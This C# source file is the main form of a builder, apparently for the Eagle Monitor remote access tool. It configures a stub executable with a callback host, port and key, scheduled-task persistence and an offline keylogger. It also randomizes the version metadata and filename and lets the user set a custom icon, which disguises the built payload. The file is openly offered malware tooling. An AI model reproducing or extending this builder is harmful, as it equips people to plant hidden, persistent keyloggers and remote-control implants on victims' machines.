using EagleMonitor.Controls;
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_Builder
{
    public partial class Main : FormPattern
    {

        public Main()
        {
            InitializeComponent();
        }

        internal static Helpers.Config config;
        private string iconPath { get; set; }
        private void Main_Load(object sender, EventArgs e)
        {
            if (System.IO.File.Exists(Helpers.Utils.GPath + "\\builder.json"))
            {
                string json = System.IO.File.ReadAllText(Helpers.Utils.GPath + "\\builder.json");
                config = JsonConvert.DeserializeObject<Helpers.Config>(json);

                portGuna2TextBox.Text = config.port;
                keyGuna2TextBox.Text = config.key;
                taskNameGuna2TextBox.Text = config.taskName;
                timeTaskGuna2TextBox.Text = config.time;
                dnsGuna2TextBox.Text = config.ipOrDns;

                if (config.persistence) 
                {
                    persistenceGuna2CheckBox.Checked = config.persistence;
                    taskNameGuna2TextBox.Enabled = true;
                    timeTaskGuna2TextBox.Enabled = true;
                }

                if (config.keylog != "False") 
                {
                    offKeyloguna2CheckBox.Checked = true;
                }

                if(config.is64BitStub)
                    x64StubGuna2CheckBox.Checked = true;

                if (config.stub.Contains("VB")) 
                {
                    vbStubGuna2CheckBox.Checked = true;
                }
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            Helpers.Config jsonConfig = new Helpers.Config
            {
                ipOrDns = dnsGuna2TextBox.Text,
                port = portGuna2TextBox.Text,
                key = keyGuna2TextBox.Text,
                time = timeTaskGuna2TextBox.Text,
                taskName = taskNameGuna2TextBox.Text,
                keylog = offKeyloguna2CheckBox.Checked.ToString(),
                persistence = persistenceGuna2CheckBox.Checked,
                is64BitStub = x64StubGuna2CheckBox.Checked
            };
            if (vbStubGuna2CheckBox.Checked)
                jsonConfig.stub = "VB.exe";
            else
                jsonConfig.stub = ".exe";

            System.IO.File.WriteAllText(Helpers.Utils.GPath + "\\builder.json", JsonConvert.SerializeObject(jsonConfig));
            Helpers.Utils.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void buildGuna2Button_Click(object sender, EventArgs e)
        {
            if (tosLicenseGuna2CheckBox.Checked)
            {
                Helpers builder = new Helpers();

                string finalStubPath = Helpers.Utils.stubPath;
                if (vbStubGuna2CheckBox.Checked)
                    finalStubPath += "VB";

                if (x64StubGuna2CheckBox.Checked)
                    finalStubPath += "64";

                builder.Build(
                    finalStubPath + ".exe",
                    dnsGuna2TextBox.Text,
                    portGuna2TextBox.Text,
                    keyGuna2TextBox.Text,
                    taskNameGuna2TextBox.Text,
                    timeTaskGuna2TextBox.Text,
                    offKeyloguna2CheckBox.Checked.ToString(),
                    new string[] {
                    fileVersionGuna2TextBox.Text,
                    productVersionGuna2TextBox.Text,
                    productGuna2TextBox.Text,
                    descriptionGuna2TextBox.Text,
                    companyGuna2TextBox.Text,
                    copyrightGuna2TextBox.Text,
                    trademarksGuna2TextBox.Text,
                    filenameGuna2TextBox.Text
                    },
                    iconPath
                    );
            }
            else 
            {
                MessageBox.Show("You forgot to agree with TOS and license !");
            }
        }

        private void persistenceSoundGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (persistenceGuna2CheckBox.Checked)
            {
                taskNameGuna2TextBox.Enabled = true;
                timeTaskGuna2TextBox.Enabled = true;
            }
            else 
            {
                taskNameGuna2TextBox.Enabled = false;
                timeTaskGuna2TextBox.Enabled = false;
            }
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            fileVersionGuna2TextBox.Text = $"{RandomInt.NextInt(1)}.{RandomInt.NextInt(1)}.{RandomInt.NextInt(1)}.{RandomInt.NextInt(1)}";
            productVersionGuna2TextBox.Text = $"{RandomInt.NextInt(1)}.{RandomInt.NextInt(1)}.{RandomInt.NextInt(1)}.{RandomInt.NextInt(1)}";
            productGuna2TextBox.Text = RandomString.NextString(new Random().Next(10, 20));
            descriptionGuna2TextBox.Text = RandomString.NextString(new Random().Next(10, 20));
            companyGuna2TextBox.Text = RandomString.NextString(new Random().Next(10, 20));
            copyrightGuna2TextBox.Text = RandomString.NextString(new Random().Next(10, 20));
            trademarksGuna2TextBox.Text = RandomString.NextString(new Random().Next(10, 20));
            filenameGuna2TextBox.Text = RandomString.NextString(new Random().Next(10, 20));
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Choose Icon";
                dlg.Filter = "Icons *.ico|*.ico";
                dlg.Multiselect = false;

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    iconPath = dlg.FileName;
                    pictureBox1.Image = Image.FromFile(iconPath);
                }
            }
        }
    }
}
